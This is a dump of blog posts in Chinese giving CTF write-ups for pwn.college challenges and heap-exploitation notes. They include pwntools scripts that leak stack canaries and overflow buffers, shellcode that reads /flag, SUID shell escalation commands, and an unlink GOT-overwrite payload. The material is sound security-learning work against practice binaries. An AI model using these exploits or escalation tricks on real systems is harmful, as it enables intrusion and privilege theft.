b&#x27;a&#x27;*35+b&quot;REPEAT&quot;p.sendline(b&quot;41&quot;)p.send(payload1)p.recvuntil(&#x27;You said:&#x27;)canary = u64(p.recv()[41:49])canary -= 0x54payload2 = b&#x27;a&#x27;*41 + p64(canary) + b&#x27;a&#x27;*8 + b&quot;\\x91\\xb0&quot;p.send(&#x27;100&#x27;)p.send(payload2)p.interactive() Level12.1​ 同理，但是需要好好调。 1234567891011121314151617181920212223242526from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./babymem_level12.1&quot;)payload1 = b&#x27;a&#x27;*83+b&quot;REPEAT&quot;p.sendline(b&quot;89&quot;)gdb.attach(p)p.send(payload1)p.recvuntil(&#x27;You said:&#x27;)canary = u64(p.recv()[89:97])canary -= 0x54print(hex(canary))payload2 = b&#x27;a&#x27;*89 + p64(canary) + b&#x27;a&#x27;*8 + b&quot;\\x63\\x18&quot;p.send(&#x27;112&#x27;)p.send(payload2)pause()p.interactive() level13.0​ 。。输几个a就有flag，具体方法看13.1。 level13.1​ 我觉得是最简单的level了。。 ​ 找到input buffer和flag间地址的填充量，填大于等于的a就行，数量没有必要精确。这个题脚本都没有写，实在太傻逼了。 level14​ 其实我觉得这个题没有写的必要了，纯纯的就是13和12的结合。 level15.0​ 一个奇怪的socket网络通信，我觉得思路是通过fork多个子进程来leak canary，但是由于从来没有接触过，所以先研究一会儿吧。","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"ProgramMisuse","slug":"pwn.college_ProgramMisuse","date":"2022-03-03T03:09:26.547Z","updated":"2022-03-20T04:32:28.825Z","comments":true,"path":"2022/03/03/pwn.college_ProgramMisuse/","link":"","permalink":"https://fuurinko.github.io/2022/03/03/pwn.college_ProgramMisuse/","excerpt":"","text":"​ 关于这个module，做出题目的话大致有两个思路，一个是利用/bin/sh 来对整个shell提权，另外一个是利用设置了suid的特殊程序来读取flag。一般来说是第二个方法比较简单，但是有时候只有第一个方法可以行得通。 Level1​ 没有看视频，并不知道这个Misuse是什么意义，但是level1只要执行给的程序就能get flag。 Level2​ 到第二题大概懂它的用意了，来补充一些知识吧。 ​ ​ 可以看到原本我们只用普通用户权限，但是由于可执行程序将 /usr/bin/more 设置为了超级权限，使得这个功能能够读取到flag的内容。 ​ 然后关于SUID，也就是Set uid ID。如果将对应位设置为S，就能够以可执行文件的owner权限执行它们。 ​ （SUID）仅对二进制可执行文件有效。 参考：[Linux 特殊权限 SUID,SGID,SBIT ] Level3-9​ xxx flag Level 10​ 指令为rev，所以对于获得的flag我们需要翻转一下，可以就直接用rev来。 Level 11​ 控制od的参数，并需要简单的脚本处理字符串的空格。 Level12-17​ 按照给的可执行文件来。 ​ 之前碰到这个问题的时候并咩有理解，现在算是理解了。 Level21ar -r a flag cat a Level27nice /bin/sh -p Level28 Level29​ 利用stdbuf设置输出缓冲为0，利用/bin/sh执行并提权。 Level30​ Level34 Level35 Level36 Level37 Level38 level39 Level41Level42 Level45 Level47 Level49","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Sandboxing","slug":"pwn.college_Sandboxing","date":"2022-02-28T13:59:27.326Z","updated":"2022-03-20T04:32:53.988Z","comments":true,"path":"2022/02/28/pwn.college_Sandboxing/","link":"","permalink":"https://fuurinko.github.io/2022/02/28/pwn.college_Sandboxing/","excerpt":"","text":"Level1​ 首先考察chroot ​ 因为程序在将根目录设置为/jail的时候并没有切换当前工作目录为/jail，所以我们实际上还是在/目录，因此可以直接通过argv[1] 读取flag。 ​ 执行脚本的时候需要添加cwd参数，使其工作目录为/ Level2123shellcode = asm(shellcraft.readfile(&#x27;flag&#x27;,1))p = process([&quot;/challenge/babyjail_level2&quot;, &quot;/&quot;],cwd=&#x27;/&#x27;)p.send(shellcode) Level3​ 关键源码： 1234567891011121314151617181920212223242526assert(argc &gt; 1); puts(&quot;Checking to make sure you&#x27;re not trying to open the flag.\\n&quot;); assert(strstr(argv[1], &quot;flag&quot;) == NULL); int fd = open(argv[1], O_RDONLY|O_NOFOLLOW); if (fd &lt; 0) printf(&quot;Failed to open the file located at `%s`.\\n&quot;, argv[1]); else printf(&quot;Successfully opened the file located at `%s`.\\n&quot;, argv[1]); char jail_path[] = &quot;/tmp/jail-XXXXXX&quot;; assert(mkdtemp(jail_path) != NULL); printf(&quot;Creating a jail at `%s`.\\n&quot;, jail_path); assert(chroot(jail_path) == 0); puts(&quot;Moving the current working directory into the jail.\\n&quot;); assert(chdir(&quot;/&quot;) == 0); int fffd = open(&quot;/flag&quot;, O_WRONLY | O_CREAT); write(fffd, &quot;FLAG&#123;FAKE&#125;&quot;, 10); close(fffd);","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"ReverseEngineering","slug":"pwn.college_ReverseEngineering","date":"2022-02-14T20:11:23.367Z","updated":"2022-03-20T04:32:48.611Z","comments":true,"path":"2022/02/15/pwn.college_ReverseEngineering/","link":"","permalink":"https://fuurinko.github.io/2022/02/15/pwn.college_ReverseEngineering/","excerpt":"","text":"Level1.0 Level1.1​ 同上，一样的做法。 Level2.0​ 交换idx3和idx4的位置 Level2.1​ 交换idx1和idx4. ​ ps： ​ 输入五个字符，转化为ascii后以int类型贮存，从栈布局可以看出v10大小是4个字，所以第五个字被储存在v11。 Level3.0​ reverse Level3.1​ 同上。 Level4.0123456789101112for ( j = 0; j &lt;= 3; ++j ) &#123; for ( k = 0; k &lt; 4 - j; ++k ) &#123; if ( *((_BYTE *)&amp;v15 + k - 14) &gt; *((_BYTE *)&amp;v15 + k - 13) ) &#123; v4 = *((_BYTE *)&amp;v15 + k - 14); *((_BYTE *)&amp;v15 + k - 14) = *((_BYTE *)&amp;v15 + k - 13); *((_BYTE *)&amp;v15 + k - 13) = v4; &#125; &#125; &#125; ​ 一个简单的冒泡排序算法。 level4.1​ 同上 Level5.012for ( j = 0; j &lt;= 4; ++j ) *((_BYTE *)&amp;v13 + j - 14) ^= 0xCDu; ​ 异或加密，需要用到简单的脚本（手抠也不是不行） Level5.1​ 同上，好饿。 Level6.0​ 可以批量导出数据，避免手动处理数组 ​ 程序的逻辑是输入的字符串进行降序排序-&gt;条件异或，我们需要通过结果反推输入值， ​ 因为程序一定会对字符串进行降序排序，所以输入字符串的顺序其实意义不大，无论是怎么打乱，最后处理的结果都是一样的。 12345678910x = [0x64, 0x59, 0x60, 0x59, 0x7F, 0x40, 0x77, 0x4E, 0x77, 0x4C, 0x75, 0x4D, 0x73, 0x4B, 0x71]for i in range(15): if (i % 2 == 0): x[i] ^= 0x10 else: x[i] ^= 0x29 a = chr(x[i]) print(a)","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Debugging Refresher","slug":"pwn.college_Debugging Refresher","date":"2022-02-14T08:16:26.477Z","updated":"2022-03-20T04:31:15.149Z","comments":true,"path":"2022/02/14/pwn.college_Debugging Refresher/","link":"","permalink":"https://fuurinko.github.io/2022/02/14/pwn.college_Debugging%20Refresher/","excerpt":"","text":"Level1​ 直接r，然后c到断点。 Level2​ p/x $r12 Level3​ 不好描述，可以根据后面的正确随机数在栈中找到对应的位置，然后重新执行并输入。 Level4​ 。。。。 Level5gdb脚本。","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Assembly_Refresher","slug":"pwncollege_Assembly_Refresher","date":"2022-01-29T13:51:29.070Z","updated":"2022-03-20T04:32:27.126Z","comments":true,"path":"2022/01/29/pwncollege_Assembly_Refresher/","link":"","permalink":"https://fuurinko.github.io/2022/01/29/pwncollege_Assembly_Refresher/","excerpt":"","text":"Level1需要设置*rdi = 0x1337， 如果是按照目的意思程序的汇编代码长这样子： 12345.section .text .intel_syntax noprefix .global _start _start : mov rdi, 0x1337 但是可以直接用pwntools传输mov rdi, 0x1337这一句。 12345678910111213#!/usr/bin/env python3import pwnpwn.context.log_level = &quot;INFO&quot;pwn.context.encoding = &quot;latin&quot;pwn.context.arch = &quot;amd64&quot;pwn.warnings.simplefilter(&quot;ignore&quot;)assembly = &quot;&quot;&quot;mov rdi, 0x1337&quot;&quot;&quot;proc = pwn.process(&quot;/challenge/embryoasm_level1&quot;)print(proc.readrepeat(1).decode())proc.send(pwn.asm(assembly))print(proc.readrepeat(1).decode()) 一个好用的exp，可以直接在非根目录下执行。 Level2add rdi, 0x331337 Level3 出师未捷身先死。 这里应该是对于汇编乘法对于寄存器的改变不太清楚 ​ 问题出在64位乘法会产生128位乘积，储存在rdx:rax中由于题目给的都是低32位的所以高32位全部是0，相当于mul之后rdx就变成了0，自然拿不到flag。 Level4​ 简单的64位汇编除法。相关的指令都已经给出了，抄作业就行。 Level5​ 依然是简单的除法，涉及到余数的处理。既然余数存在rdx，mov rax，rdx就行。 Level6​ 对于低位的数字运算（好烦）， 12rax = rdi modulo 256 ;2^8rbx = rsi module 65536 ;2^16 ​ 所以edi和esi没有低八位吗？ 可能是吧，就像正常来说ebp和esp也没有低八位。 Level7​ 进行移位操作的练习，需要让rax为rdi的b3位的值 ​ Level8​ 与操作。 Level9​ 简单的奇偶判断，rax应该是1与rdi lsb异或后的结果。 Level10​ 简单的间接寻址。 ​ 要注意的是这里面有一些规范，大概就是不能mov [register],number;。也就是说涉及到寄存器间接寻址的操作都不能用立即数，而是需要利用寄存器。 Level11​ 涉及对byte，word ，dword和qword的size的理解。 Level12​ 我发现这个东西最恼人的不是做本身而是看题，不想看题好烦，题好长。但是只看问题又不能瞬间找到思路。。。 ​ 考点是利用寄存器间接寻址设置寄存器的值为指定值。（本来以为要考虑小端序造成的影响但其实不用考虑） ​ Level13​ 也就是一个按照地址偏移寻址的方式的理解。（基址寻址） Level14​ 对于出入栈相关指令的简单理解。 ​ 做题的时候卡了一下，因为没有正确理解题意，我以为是需要把栈顶值减去rdi后的值存到rax中就行，但是题意其实是让我们改变栈顶的值，所以我们将rax取出减rdi后还需要push回去。（还是吃了英语不好的亏捏） ​ Level15​ 还是围绕栈的先入后出的练习。 ​ ​ Level16​ 利用rsp来寻址。 ​ ​ 这里我把rdx清零了，属于是多此一举。 Level17​ 这题干怎么越来越长。 ​ 等会儿再做。 ​","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Shellcode_Injection","slug":"pwn.college_Shellcode_Injection","date":"2022-01-29T09:37:52.632Z","updated":"2022-03-20T04:32:57.713Z","comments":true,"path":"2022/01/29/pwn.college_Shellcode_Injection/","link":"","permalink":"https://fuurinko.github.io/2022/01/29/pwn.college_Shellcode_Injection/","excerpt":"","text":"​ 整个专题其实就是一个shellcode编写的小练习，并不需要自己寻找漏洞点，写好shellcode直接注入就行。 ​ 如果要将服务器的文件传输到本地的话可以使用: 1scp -i key -r hacker@dojo.pwn.college:/challenge [本地路径] Level1​ 可以用pwntools的shellcraft模块，但是也可以手写shellcode。 ​ 这道题可以用简单的orw的思路做。但是shellcode的地址需要在规定的地方。 123shellcode = shellcraft.amd64.open(&quot;/flag&quot;) shellcode += shellcraft.amd64.read(&#x27;rax&#x27;, stack + 0x100, 0x100)shellcode += shellcraft.amd64.write(1, stack + 0x100, 0x100) Level21234shellcode = shellcraft.amd64.nop()*0x800shellcode = shellcraft.amd64.open(&quot;/flag&quot;) shellcode += shellcraft.amd64.read(&#x27;rax&#x27;, stack + 0x100, 0x100)shellcode += shellcraft.amd64.write(1, stack + 0x100, 0x100) Level3​ 换个地址就行 Level4​ shellcode不能含有”H”。 ​ 第一个想到的就是不能含有push，其他指令似乎也没有h了。想要完成的话第一个思路是手写不含push的shellcode，另外一个思路是构造跳板读取其他位置的shellcode（这种思路其实比较常见并且配套的视频中也提到过） ​ 但是实际做题体验极差，写了read()后，读取的shellcode无论怎样都无法读到flag，明明已经getshell了，也没有eof，但是就是没办法。以后再想吧。 Level5 ​ 需要让shellcode在运行时生成syscall()。 一个比较自然的想法就是把对应的机器码储存在寄存器中，然后拿出来用。 int 0x80对应的机器码CD 80","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"Program_interaction","slug":"pwn.college_Program_interaction","date":"2022-01-17T13:30:41.758Z","updated":"2022-03-20T04:32:14.067Z","comments":true,"path":"2022/01/17/pwn.college_Program_interaction/","link":"","permalink":"https://fuurinko.github.io/2022/01/17/pwn.college_Program_interaction/","excerpt":"","text":"「前面不太记得了，从level3记起」 level3 ./embryoio_level3 xkbdyoisnx Level4export jouixn = xxx Level5​ 一个标准输入重定向的考察， ./embryoio_level5 &lt; /tmp/mihsjr ​ 还需要编辑mihsjr 的内容为给的密码。 Level6​ 一个输出重定向，创建对应文件./embryoio_level6 &gt; /tmp/ptyaid ，flag在ptyaid中。 Level7env -i ./xxx Level8​ 写个sh脚本，内容是打开这个题目。注意路径。 12hacker@embryoio_level8:~$ cat my_script.sh /challenge/embryoio_level8 Level9​ 与level8同理，顺手输个密码就行。 Level10​ 同level3 Level11​ 同level4。 Level12​ 同level5 Level13​ 同level6 Level14​ 同level7 Level15​ 一言难尽，可以在ipython里用pwntools。 Level16​ 同15。 Level17​ 这几个level就是将python与之前level的命令行参数或者环境变量结合，虽然难度不高但是很考验pwntools运用的熟练度。所以我还没有找到做出来的方法。 Level18​ 利用python设置环境变量，主要利用到os.environ或者os.putenv函数。 Level19​","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"unsortedbinleak","slug":"unsortedbin leak","date":"2021-12-11T11:32:01.748Z","updated":"2022-03-26T04:21:03.136Z","comments":true,"path":"2021/12/11/unsortedbin leak/","link":"","permalink":"https://fuurinko.github.io/2021/12/11/unsortedbin%20leak/","excerpt":"","text":"​ 一个简单的trick。 ​ 并且在trick就是tcache，接下来就是刷题熟练，最后再简单学习一下largin bin和small bin的利用。 ​ unsortedbin 由双向循环链表管理，表头为main_arena，所以表末尾的chunk的fd会指回main_arena，这样我们就获得了main_arena结构体内部的的地址，通过调试我们就能得到main_arena的真正的地址，并且main_arena与libc基地址有固定偏移，就能四舍五入获得libc的基地址。 ​ 如何泄露这个fd呢？ ​ 一般情况下，可以利用UAF，show出 unsorted chunk的fd。 ​ 当bin中只有一个chunk时，由于bin中一般都是干净的，该bin的fd和bk都会指向main_arena中 ​ 那么如何得到main_arena与libc的固定偏移呢？ ​ 有两种方式： ​ 1:用IDA找到.so文件的 malloc_trim 函数，就可以获得偏移。 123456789101112131415161718192021int__malloc_trim (size_t s)&#123; int result = 0; if (__malloc_initialized &lt; 0) ptmalloc_init (); mstate ar_ptr = &amp;main_arena;//&lt;=对main_arena进行了访问，用伪代码看到的结果就是main_arena和libc的固定偏移。 do &#123; __libc_lock_lock (ar_ptr-&gt;mutex); result |= mtrim (ar_ptr, s); __libc_lock_unlock (ar_ptr-&gt;mutex ar_ptr = ar_ptr-&gt;next; &#125; while (ar_ptr != &amp;main_arena); return result;&#125; ​ 2:通过malloc_hook算出。 1main_arena_offset = ELF(&quot;libc.so.6&quot;).symbols[&quot;__malloc_hook&quot;] + 0x10","categories":[{"name":"HEAP-Unsortedbin","slug":"HEAP-Unsortedbin","permalink":"https://fuurinko.github.io/categories/HEAP-Unsortedbin/"}],"tags":[]},{"title":"positive sp value has been found","slug":"ida 7.0 for mac疑难杂症： positive sp value has been found","date":"2021-12-10T08:05:39.212Z","updated":"2022-03-20T04:31:33.232Z","comments":true,"path":"2021/12/10/ida 7.0 for mac疑难杂症： positive sp value has been found/","link":"","permalink":"https://fuurinko.github.io/2021/12/10/ida%207.0%20for%20mac%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%EF%BC%9A%20positive%20sp%20value%20has%20been%20found/","excerpt":"","text":"0）​ 自从抛弃虚拟机，利用ida for mac+pwndocker实现完全mac环境以后，深觉优雅的同时，也遇见了不少坑。 ​ 其中ida的坑更是坑人于无形之中。因为如果不打开win的7.5（甚至7.6）做对比，你甚至不知道你遇见的一些奇怪的东西，是7.0 mac版特有的，已经被优化了的坑，还是自身逆向水平问题。 ​ 作为一个逆向废物，7.0 for mac属实是给本来就逆不出的我雪上加霜，但是就算是这样，我也宁愿花时间解决问题，而不是重新回到虚拟机win的悲惨过往，因为这不优雅。（优雅这个词到底害死了多少人捏） 1）​ 目前碰到的最多的一个问题，就是： ​ ​ 其实这个严格来讲算不上问题，因为你只需要找到main函数再f5，照样能够反编译，但是每次弹出的这个框就让我很恼火。所以解决问题的目标在于修改ida使得不再弹出这个框，而不是修改程序治标不治本捏。 ​ 对于问题本身，其实还是比较常规，只需要patch一下就好了。 ​ 我这里是_start()堆栈不平衡， ​ ​ 问题显然出在and rsp, 0FFFFFFFFFFFFFFF0h到start结束的这一大段。call完main以后居然没有retn。 ​ 首先报堆栈不平衡的错误大概就是因为ida要求stack pointer在函数开头和结束时相等。然后导致堆栈不平衡，通常是因为程序本身含有代码混淆/花指令，但是这是一道pwn题，为什么要在这种地方为难人。 ​ 我超，流汗黄豆原来是为难的意思。 ​ ​ 首先最让我疑惑的就是末尾的hlt指令，它取代了retn，然后它的意思是暂停指令，而不是返回。为什么这个地方会有一条这样的指令，是程序原本设计的还是ida反编译的问题？ ​ 稍微学习了一下，意识到start函数是被拆成了三个部分，所以只反编译一个部分肯定有问题。 ​ 但是虽然这样堆栈平衡，但是还是无法反编译，我也不清楚里面是不是有什么花指令。 ​ 和胖爷爷交流了一下，7.5及以上也会出现这个错误，但是完全可以反编译，并且start就是只有那么一段，没有后面的一堆东西。我不理解，我也修复不了，这篇文章毫无意义，但是学习了一些修复堆栈不平衡的方法（ ）参考​ IDA出现”sp-analysis failed”和F5(反编译)失败 ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://fuurinko.github.io/tags/%E9%80%86%E5%90%91/"}]},{"title":"UNLINK","slug":"unlink","date":"2021-12-09T17:33:53.716Z","updated":"2022-03-25T11:56:32.276Z","comments":true,"path":"2021/12/10/unlink/","link":"","permalink":"https://fuurinko.github.io/2021/12/10/unlink/","excerpt":"","text":"UNLINK​ 就是将free chunk从双向循环链表中解链的过程，当然这里的解链一般来说是指在对空闲块进行合并的时候的unlink。借用malloc lab中的简化的unlink的代码，就是： 12SET_PREV(next,prev);SET_NEXT(prev,next) ​ 也就是把下一个chunk的PREV位设为上一个chunk的bp，把上一个chunk的next位设为下一个chunk的bp。这样把当前chunk空出来，完成了unlink。 ​ 在ptmalloc中则是： 12345#小写的指fd和bk位，大写指前/后chunk bpFD=P-&gt;fd #前一个chunk bp = 当前chunk的fd，相当于赋值。BK=P-&gt;bk# #后一个chunk bp = 当前chunk的bkFD-&gt;bk = BK #前一个chunk的bk位 = 当前chunk的bk，也就是前一个chunk的bk等于后一个chunk的 bpBK-&gt;fd = FD #后一个chunk的fd = 前一个chunk的bp ​ ​ （在这里我一直忽略一个很重要的点，就是p-&gt;fd是一个指针，保存了FD_prevsize的地址，bk同理，于是在unlink时，FD-&gt;bk=BK，其中 FD-&gt;bk的地址是p-&gt;fd+12，但是实际unlink需要的是将这个地址的内容替换为BK，所以应该是*(p-&gt;fd + 12)=BK而不是是(p-&gt;fd + 12)=BK ​ 所以在比较远古的版本中，由于glibc没有给unlink做什么检查，导致我们那可以伪造unlink时与前/后连接的chunk，导致申请到伪造的chunk。 ​ （给键盘换了静音轴，感觉会更费力一些，应该买红轴的555） 古早的unlink利用​ ps：有一些内容是参照我之前第一次学习时做的笔记。 ​ 刚才说到，unlink的操作是将前一个chunk的bk指针指向后一个chunk，后一个chunk的fd指针指向前一个chunk，我们可以选择通过控制后一个chunk的指针来篡改本来要连接的对象。 ​ 举一个例子，如果有两个物理地址连续的small chunk0和small chunk1（这里chunk size必须要大于fastbin，因为fastbin chunk就只是将chunk放进fastbin链表中管理，并且为了效率，每个chunk的prev_inuse位都没有修改，在链表中也不会进行合并），前一个chunk0是allocated，后一个chunk1是free，这时候如果我们释放chunk0，由于两个chunk都是free状态，所以ptmalloc判断两个chunk需要合并，于是首先需要把chunk1从双向循环链表中拿出来与chunk0合并，合并之后再放回去。 ​ 这时我篡改chunk0的bk指针指向一个我们希望的target_addr的bp，再将target_addr+8改成chunk0的bp。这样在unlink的时候，实际连接的就是chunk0与target_addr，chunk1就被忽略掉了。 ​ 但是在实际的利用中，这样需要修改两个chunk。或者说两个内存块，未免有些麻烦，注意到unlink的操作之前是有一个类似“赋值”的操作的，这里是不是也能够作为攻击的切入点？ ​ FD=P-&gt;fd;BK=P-&gt;bk;FD-&gt;bk = BK;BK-&gt;fd = FD，其实前面的两步虽然不是实际的unlink的操作，但是也十足关键，这两个操作判定了前后chunk的bp，可以说后面unlink操作都是基于前面两步指定的指针来进行的，所以我们只需要把目光投向当前chunk的fd和bk位，修改它们，就相当于同时修改了前一个chunk和target chunk。 ​ 那么还是之前举的例子，我们不修改chunk0或target chunk，而是修改chunk1本身。 ​ 我们最终的目的还是希望能够通过一个libc函数+参数的形式，执行某些特定的函数。所以我们希望利用unlink修改函数的got表。 ​ 比如说为了show某些地址，改free got为puts got，为了getshell，改atoi got为system got。 ​ 要修改got表，一个通用的步骤，是先在chunk content上填上got addr，然后将chunk content作为一个指针，分配chunk content指向的内存块，也就是got，再利用edit或者其他东西修改这个内容。 ​ 比如我们首先需要伪造一个show的功能，就需要将某个函数的got替换成puts（已经包含的任意输出函数，哦，其实常见的只有puts和printf），比如说经典受害人free（）。 ​ 那么又该如何实现这样的效果？ ​ 我们可以在FD=P-&gt;fd这一步时将fd赋值为某个got addr -12（这是一个got表值的地址）。然后在BK=P-&gt;bk时给bk赋一个值，比如说system got（这是一个got表值），然后unlink时，FD-&gt;bk = BK，会先找到FD的地址，也就是got addr - 12，然后找到FD的bk指针，也就是got addr -12 + 12（32位），再解引用，使得找到的FD-&gt;bk的地址对应的内存块的值为BK，也就是我们刚刚篡改过的got的值，这样就成功了。 ​ 例子stkof检查文件：​ ​ 64位动态链接文件，没开PIE，问题不大。 逆向​ (打开ida的时候又遇到了那个无关紧要但是很令人火大的问题，尝试解决) ​ ![](https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/截屏2021-12-10 下午4.13.01.png) ​ ​ ​ ​ 到最后还是没有办法解决，确实还是ida的版本问题，没有办法了，就放任吧。 ​ ​ 如何在最短时间内最精准地逆向，一直是个问题。 ​ 连个菜单都没有叫什么菜单题嘛。 main edit ​ 这里因为输入的size的大小是任意的，就意味着我们能够向chunk中读入无限制的数据，导致堆溢出。 add ​ 这里会将content的指针保存在heap[]中。 free 还有这个不知道是干嘛的函数。 漏洞利用思路​ 整理一下。还是菜单题，增删改，没有查。改没有限制输入字符的长度，存在堆溢出，查的话需要我们自己改got表然后泄露数据。 ​ libc还是2.23（不过这个好像是14年的题，在当时应该是道难题吧qwq） ​ 首先是因为程序没有设置取消缓冲区，所以在我们输入东西，实际分配chunk之前，程序还会申请一堆chunk用于缓冲，所以为了不影响调试，需要先申请一个大chunk来把这些缓冲区申请了。 ​ 想一想，这道题的思路大致是通过unlink改got表然后调用system(&quot;/bin/sh&quot;)来getshell。因为没有show函数，所以需要先利用改got表的方式伪造一个puts()，并且如何通过unlink改got表也是一个问题。 ​ 第一步需要将free函数的got表修改为puts函数的got表，这一步我们需要在free got addr处填入puts plt。 ​ 在前面介绍unlink利用时，举的例子就是利用unlink改表，那么这种方式能不能用在这道题上呢？ ​ 先申请三个chunk，第一个chunk用来填缓冲区，意义不大，第二个chunk用来触发unlink，第三个chunk用来被修改fd和bk。首先非常自然地想到，将chunk3的fd改为free got addr - 0x18，bk改为puts plt。 ​ 稍微往后想一下，这样unlink了之后。p-&gt;bk就被完全破坏了，我们只是获得了一个puts函数，但是我们还需要将atoi gots改为system，这样做就无法故技重施了，未免有些破釜沉舟， 不妨使用一些更加精妙的技巧。由于每个chunk ptr都被保存在heap结构中，所以如果我们能伪造一个fake chunk到heap结构体处，就能修改每个heap[]，也就是对应的chunk ptr为不同函数的got表，这样当我们修改chunk content时，就相当于修改了函数的got表内容了。 ​ 所以目前最大的问题是如何伪造一个fake chunk到heap结构体处。 ​ 思路就是利用unlink，将chunk2的fd修改为heap2 - 0x18，这样当unlink时，FD= p -&gt;fd = heap2 - 0x18，相当于chunk2前一个chunk是在heap2 - 0x18的位置，然后FD-&gt;bk = BK，也就是heap2 = BK。这里有两种理解的方式，一种是fake chunk的ptr位于heap2的位置。所以我们能够编辑chunk2（实则是编辑fake chunk）来修改heap结构体储存的chunk ptr。 ​ 这样我们就可以修改heap[0]为free got，1为puts got，2为atoi got，然后edit chunk0，将内容编辑为puts的plt表（因为此时chunk0的ptr指针已经被修改为free的got表地址了） ​ 这样我们就获得了puts函数。这时我们puts（1），就能获得chunk1的实际ptr地址，注意这时候这个实际ptr就是puts的got表值，这样我们就可以进行rop获得system的真实地址了。 ​ 然后利用类似的步骤将atoi的got表覆盖为system的got表，最后只要发送&quot;/bin/sh&quot;就能getshell。 ​ 实际exp利用​ 首先连续申请四个chunk。chunk大小至少是small。 123add(0x100)#0，bufferadd(0x30)#1，trigger unlinkadd(0x80)#2 ​ 利用edit功能，将chunk1伪造成一个free fake chunk。 123456789payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk&#x27;s prev_size bypass the check payload = payload.ljust(0x30, &#x27;a&#x27;) payload += p64(0x30)# make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) ​ ​ 这一段最关键的就是这两句： 12payload += p64(head + 16 - 0x18) #fdpayload += p64(head + 16 - 0x10) #bk ​ 当unlink时，操作如下： 123FD -&gt; bk = BK =&gt; head + 16 = head + 16 - 0x10BK -&gt; fd = FD =&gt; head + 16 -0x10 + 0x10 = head + 16 = head +16 -0x18 ​ 其实就是在head +16（这是一个地址）处填入了head +16 -0x18的内容。 ​ 然后非常有趣的是（也是精心构造的结果），head + 16点内容正好就是chunk2 ptr，也就是相当于这个操作使得将chunk2的ptr改成了 head +16 - 0x18。 ​ 也就是在head +16 - 0x18处构造了一个fake chunk。后续的利用就简单起来了。 ​ 然后进入chunk2的内存空间，首先我们为了将chunk1伪造成一个free块，对于chunk2的域需要修改的就是prev_size和pre_inuse，也就是分别改为0x30和0x90。 1 ​ 接着free（2），触发unlink。 ​ 如图，从da530开始的就是chunk1，从570开始是chunk2. 12345678910chunk2-&gt;fd = heap[2] - 0x18chunk2-&gt;bk = heap[2] - 0x10FD_chunk_bp = chunk2-&gt;fd = heap[2] - 0x18BK_chunk_bp = chunk2-&gt;bk = heap[2] - 0x10FD_chunk -&gt;bk = *（heap[2] - 0x10 + 0x18） = *heap[2] = BK_chunk -&gt;fd = *（heap[2] -0x10 + 0x10 ）= *heap[2] ​ 也就是达到了*heap[2] = heap[2] - 0x18 ​ ​ 结果似乎不尽人意，可以看到虽然unlink了，chunk2也被free了，但是似乎并没有达到效果。 ​ ​ 参考hitcon14_stkof","categories":[{"name":"HEAP - UNLINK","slug":"HEAP-UNLINK","permalink":"https://fuurinko.github.io/categories/HEAP-UNLINK/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"off by one /chunk overlapping","slug":"off by one","date":"2021-12-08T02:30:31.469Z","updated":"2022-03-20T04:32:03.200Z","comments":true,"path":"2021/12/08/off by one/","link":"","permalink":"https://fuurinko.github.io/2021/12/08/off%20by%20one/","excerpt":"","text":"Off by one​ 单/空字节溢出攻击。 ​ 通常来说简单的off by one的漏洞点来自于编写时对边界控制不严格，导致每次输入的字符都能比规定的最大字符大那么一些（一个，或者几个）。这些字节溢出到物理地址相邻的下一个堆块，就能修改下一个chunk的size或者prev_inuse，通过这样的溢出，就能够整一些有趣的攻击。 ​ 通常单字节溢出的利用方式有如下几种： 溢出字节任意可控制字节：修改chunk size，造成堆叠，泄露或覆盖其他块的数据 溢出空字节：修改下一个chunk的prev_inuse，使得当前chunk状态为free，然后就可以：1）利用unlink进行攻击。2）对于下一个chunk来说，前一个chunk状态为free，自身的prev_size域启用，就能够伪造prev_size，改变前一个chunk的size，造成堆叠。 ​ ​ 从ctf-wiki上的一个简单的小例子开始： 123456789101112131415161718int my_gets(char *ptr,int size)&#123; int i; for(i=0;i&lt;=size;i++)#栅栏错误 